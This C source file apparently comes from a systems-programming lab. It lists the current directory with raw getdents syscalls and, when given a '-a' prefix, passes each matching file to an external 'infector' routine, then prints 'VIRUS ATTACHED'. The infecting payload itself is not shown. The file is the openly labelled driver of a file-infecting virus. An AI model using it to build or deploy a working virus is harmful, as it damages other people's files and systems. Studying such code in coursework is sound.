#define SYS_GETDENTS 141
#define SYS_WRITE 4
#define STDOUT 1
#define O_RDONLY 00
#include "util.h"

extern int system_call();
extern void infector();
extern void infection();


struct dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Not an offset; see below */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
} dirent;


int main(int argc, char *argv[], char *envp[]){
    
    int j=0;
    char* prefix = 0;
    while(j<argc){
        if((argv[j][0]=='-')&&(argv[j][1]=='a')){
            prefix = argv[j]+2;
        }
        j++;
    }
    
    
    
    int fd=system_call(5,".",O_RDONLY,0777);
    if(fd<0){
        system_call(1, 0x55);
    }
    char buf[8192];
    struct dirent *ent;
    long count=system_call(SYS_GETDENTS,fd,buf,8192);
    if((count==-1)|(count==0)){
        system_call(1, 0x55);
    }
    int i=0;
    while (i<count)
    {
        ent=(struct dirent*)(buf+i);
        system_call(SYS_WRITE,STDOUT,ent->d_name,strlen(ent->d_name));
        i=i+ent->d_reclen;
        if(prefix != 0 && strncmp(ent->d_name,prefix,strlen(prefix))==0){
            infector(ent->d_name);
            /*infection();*/
            system_call(SYS_WRITE,STDOUT," VIRUS ATTACHED",15);
        }
        system_call(SYS_WRITE,STDOUT,"\n",1);
    }

    return 0;
}
